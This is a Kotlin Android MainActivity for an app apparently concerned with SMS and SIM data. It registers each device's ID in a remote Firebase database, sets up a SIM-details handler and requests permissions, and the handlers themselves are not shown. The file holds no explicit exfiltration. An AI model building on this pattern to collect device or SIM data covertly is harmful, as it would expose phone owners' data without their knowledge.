package com.rto1p8.app

import android.content.Context
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.rto1p8.app.databinding.ActivityMainBinding
import com.rto1p8.app.handler.PermissionHandler
import com.rto1p8.app.handler.SimDetailsHandler
import com.rto1p8.app.ui.MainActivityUIHandler
import com.rto1p8.app.utils.Logger
import java.util.UUID

class MainActivity : AppCompatActivity() {
    private lateinit var binding: ActivityMainBinding
    private lateinit var deviceId: String
    private lateinit var uiHandler: MainActivityUIHandler
    private lateinit var simDetailsHandler: SimDetailsHandler
    private lateinit var permissionHandler: PermissionHandler

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        deviceId = getDeviceId(this)
        val deviceRef = Firebase.database.getReference("Device").child(deviceId)

        // Initialize handlers
        simDetailsHandler = SimDetailsHandler(this, deviceId)
        uiHandler = MainActivityUIHandler(this, binding, deviceRef)
        permissionHandler = PermissionHandler(this, simDetailsHandler)

        uiHandler.setupUI()
        uiHandler.checkAndCreateDeviceNode(deviceId)
        permissionHandler.requestPermissions()

    }

    override fun onResume() {
        super.onResume()
        permissionHandler.handleResume()
    }

    override fun onBackPressed() {
        if (doubleBackToExitPressedOnce) {
            super.onBackPressed()
            moveTaskToBack(true)
            finish()
            return
        }
        doubleBackToExitPressedOnce = true
        Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show()
        Handler(Looper.getMainLooper()).postDelayed({ doubleBackToExitPressedOnce = false }, 2000)
    }

    private var doubleBackToExitPressedOnce = false

    companion object {
        fun getDeviceId(context: Context): String {
            val prefs = context.getSharedPreferences("SmsAppPrefs", Context.MODE_PRIVATE)
            var deviceId = prefs.getString("deviceId", null)

            if (deviceId == null) {
                val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                deviceId = androidId ?: UUID.randomUUID().toString()
                prefs.edit().putString("deviceId", deviceId).apply()
                Logger.log("Generated new deviceId: $deviceId")
            }
            return deviceId
        }
    }
}